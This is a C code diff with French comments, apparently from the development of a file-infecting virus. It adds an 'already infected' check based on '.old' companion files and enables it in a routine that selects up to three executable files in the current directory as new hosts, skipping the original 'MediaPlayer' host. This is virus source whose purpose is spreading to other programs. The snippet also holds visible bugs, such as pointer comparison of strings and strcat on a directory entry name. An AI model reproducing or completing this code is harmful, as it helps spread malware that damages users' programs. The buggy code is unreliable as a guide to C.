@@ -9,7 +9,19 @@
 
 bool dejaInfecte(char* nomFichier)
 {
-	
+	char * extension = ".old";
+	if(strstr(nomFichier, extension)){ //Si contient l'extension .old --> Déjà infecté
+		return true;
+	}else{
+		DIR *rep = opendir("."); 
+		struct dirent *lecture;
+		while ((lecture = readdir(rep))) {
+			if((lecture->d_name == nomFichier) && fopen(strcat(lecture->d_name,extension),"r")!=NULL){
+				return true;
+			}
+		}
+	}
+	return false;
 }
 
 char** searchFiles()
@@ -24,7 +36,7 @@ char** searchFiles()
 		stat(lecture->d_name,&buf);
 		if(((buf.st_mode & S_IFMT) == S_IFREG) && (buf.st_mode & S_IXUSR))
 		{ //si fichier régu && executable
-			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer")!=0) //&& !dejaInfecte(lecture->d_name)
+			if(cpt<3 && strcmp(lecture->d_name,"MediaPlayer")!=0 && !dejaInfecte(lecture->d_name)) 
 			{//On ne prend que 3 fichier (lutter contre la sur-infection), et pas le premier hôte
 				printf("  - %s\n", lecture->d_name);
 				files[cpt] = lecture->d_name;
@@ -35,6 +47,8 @@ char** searchFiles()
 	return files;
 	closedir(rep);
 }
+
+
 
 int main()
 {
